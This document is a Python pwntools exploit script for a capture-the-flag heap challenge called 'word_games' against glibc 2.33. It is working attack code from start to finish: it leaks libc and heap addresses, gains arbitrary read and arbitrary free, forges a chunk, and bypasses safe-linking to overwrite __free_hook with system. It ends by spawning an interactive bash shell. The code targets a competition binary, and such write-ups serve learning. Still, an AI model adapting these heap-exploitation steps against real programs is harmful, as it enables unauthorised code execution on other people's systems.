#!/usr/bin/env python3

from pwn import *

exe = ELF("word_games_patched")
libc = ELF("libc-2.33.so")
ld = ELF("ld-2.33.so")

context.log_level = 'debug'
context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
context.aslr = True

def conn():
    r = process([exe.path])
#    gdb.attach(r, gdbscript="""
#c
#""")
    #r = remote("pwn.chal.csaw.io", 5001)
    return r

def suggest(r, size, data):
    r.sendline("1")
    r.sendlineafter("How long is your word? >", str(size))
    r.sendlineafter("What is your word? >", data)
    msg = r.recvuntil("Do you have any more words for me?")
    print("S: %s - %s" % (data, msg))

def scrap_my_list(r):
    r.sendline("2")
    r.recvuntil("Done!")

def get_favorite(r):
    r.sendline("3")
    r.recvuntil("My favorite word so far is: ")
    word = r.recvuntil(b"\nDo you")
    word = word[:word.index(b"\nDo you")]
    return word

def arbitrary_read(r, addr):
    # Before calling this, we have to have the favorites struct at
    # top of tcache. Thus we are overwriting the linked list pointer
    # with NULL and the best_word ptr with address to read.
    suggest(r, 0x10, p64(0) + p64(addr))
    leak = u64(get_favorite(r)[:8].ljust(8, b"\x00"))
    return leak

def arbitrary_free(r, addr, garbage_ll_addr):
    # Before calling this, we have to have the favorites struct at
    # top of tcache. Thus we are overwriting the linked list pointer
    # with some writable address, and best_word ptr with 
    # address to free.
    suggest(r, 0x10, p64(garbage_ll_addr) + p64(addr))

    # Before calling this you also have to have 3 words in the fun
    # list. This will be the fourth and will trigger the favorites list
    # free-ing.
    suggest(r, 0x18, b"fun" + b"E" * 0x15)
    return

def main():
    r = conn()
    
    # Some extra allocations
    suggest(r, 0x300, b"Q" * 0x2ff)
    suggest(r, 0x300, b"Q" * 0x2ff)
    suggest(r, 0x300, b"Q" * 0x2ff)
    suggest(r, 0x300, b"Q" * 0x2ff)
    suggest(r, 0x300, b"Q" * 0x2ff)
    
    # This will allocate 3 times:
    # 1. reading in / my list
    # 2. strdup into favorites list
    # 3. strcup as the 'best word' ** 8th allocation **
    suggest(r, 0x300, b"fun" + b"X" * 0x2fc)

    # This will free 6 of them
    scrap_my_list(r)
    
    # Some dummy allocations so that our favorites list ends up
    # where we want it later (see below)
    suggest(r, 0x10, b"dummy")
    suggest(r, 0x40, b"dummy")

    suggest(r, 0x10, b"funY")
    for i in range(2):
        suggest(r, 0x60+(i), b"fun" + b"X" * i)

    # At this point, the favorites list is traversed 
    # and the remaining 0x300 allocations are free'd.
    # The 'best word' allocation is free'd last and is
    # placed in the unsorted bin.
    #
    # The free'd favorites structure is corrupted by the program
    # when the linkedlist is set to NULL. So the dummy allocations above
    # were to force this corrupted free'd chunk into the "fastbin".
    # Otherwise, we will crash immediately after allocating the corrupted chunk.
    #
    # Specifically, we want to get the corrupted chunk to position 8 of fastbin.
    # This is because when tcache runs out, it will try to move 8 things
    # from fastbin and if one of them is corrupted, you hit this:
    # https://github.com/bminor/glibc/blob/30891f35fa7da832b66d80d0807610df361851f3/malloc/malloc.c#L3758
    # (i had no idea about this, i just hit the error and looked at the source to see
    # how to avoid, lol)
    # 
    
    r.recvuntil("You have given me so many")

    # Read from the favorite word. This is a free'd
    # chunk in unsorted bin, so we are reading a libc leak
    leak = u64(get_favorite(r)[:8].ljust(8, b"\x00"))
    print("leak: %s" % (hex(leak,)))
    
    # Now, lets free everything
    scrap_my_list(r)

    # Now we want to work towards getting the favorites structure out
    # of the heap so we can write overwrite the pointers it contains.
    # 
    # Currently it's at position 8 of fastbin. We free a few things,
    # and then it gets to the top of the tcache...

    for i in range(4):
        suggest(r, 4, "bad"+str(i))
    
    # OK -- now our 'favorites' structure is at the top of the tcache
    # and the next allocation will give us a write into it.
    #
    # The favorites structure has two members:
    #
    # - linkedlist (head of favorites list)
    # - favorite_word
    #
    # For linkedlist we will just put some valid pointer somewhere on heap so that 
    # we don't crash.
    #
    # Whatever we put in favorite_word will get free'd. This is our arbitrary free!
    # We will construct a fake chunk inside another chunk, and then free our fake chunk!

    stdout_ptr = leak + (0x155555511608 - 0x155555510a60) 
    heap_ptr_addr = leak + (0x155555510a70 - 0x155555510a60) 
    system = leak + (0x155555399de0 - 0x155555510a60)
    free_hook = leak + (0x155555513c80 - 0x155555510a60) # offset by -10

    # RIGHT NOW: The chunk overlapping with the favorites struct
    # is in tcache. Thus, the favorite_word ptr contains another free chunk address
    # ... free leak!
    heap_leak = arbitrary_read(r, heap_ptr_addr)
    print("heap leak: %s" % hex(heap_leak))

    garbage_ll_addr = heap_leak + (0x55555555be70 - 0x55555555b940) # doesn't really matter
    
    scrap_my_list(r)
    
    # Create our fake chunk. 0x21 is the size and flags, 0xdeadbeef is garbage contents of chunk.
    suggest(r, 0x40, b"FAKECHNK" + p64(0x21)+p64(0xdeadbeef))
    fakechunk = heap_leak + (0x55555555bc70 - 0x55555555b940)
    
    # Free our fake chunk!
    arbitrary_free(r, fakechunk, garbage_ll_addr)
    
    scrap_my_list(r)

    # Now we get our FAKECHNK chunk back (this CONTAINS the forged chunk, which
    # is now in the tcache)
    #
    # We will overwrite the fwd pointer in tcache with a pointer to free_hook
    # .. but we have to do the glibc 2.32 'safe linking' thing:
    safe_ptr = (free_hook-0x10) ^ (fakechunk >> 12)
    suggest(r, 0x40, b"FAKECHNK" + p64(0) + p64(safe_ptr)) 
    
    # We'll free this later to trigger system(/bin/bash) ... ;)
    suggest(r, 0x60, b"/bin/bash -i\0")
    suggest(r, 0x18, p64(0xdeadbeef))

    # This time malloc gave us our fake chunk
    suggest(r, 0x18, p64(0xdeadbeef))

    # malloc returns our pointer to free_hook, we overwrite with system
    suggest(r, 0x18, p64(0xdeadbeef)*2+p64(system))
    
    r.sendline("2") # scrap list, /bin/bash gets free'd
    r.interactive()


if __name__ == "__main__":
    main()
